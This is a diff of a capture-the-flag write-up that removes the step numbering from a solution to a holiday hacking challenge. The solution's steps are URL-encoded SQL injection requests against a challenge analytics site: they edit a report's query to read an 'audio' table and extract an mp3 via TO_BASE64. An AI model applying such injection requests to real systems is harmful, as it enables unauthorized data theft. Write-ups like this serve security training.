@@ -676,25 +676,25 @@ This will let us perform a 'sql injection' attack by querying any data we want b
 
 Here's how I solved this challenge:
 
-1. Edit the a report's query to view the rows in the *audio* table
+Edit the a report's query to view the rows in the *audio* table
 
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20*%20FROM%20`audio`
 ```
 
-2. Now view the report
+Now view the report
 
 ```
 https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
 ```
 
-3. To download the mp3, I used the `TO_BASE64()` function
+To download the mp3, I used the `TO_BASE64()` function
 
 ```
 https://analytics.northpolewonderland.com/edit.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029&name=&description=&query=SELECT%20TO_BASE64(mp3)%20FROM%20`audio`%20limit%201,%201
 ```
 
-4. View and copy base64 of mp3 from the website, then decode the base64 and save the mp3 file
+View and copy base64 of mp3 from the website, then decode the base64 and save the mp3 file
 
 ```
 https://analytics.northpolewonderland.com/view.php?id=cca9e991-b986-4cb0-9df8-498fbe0e3029
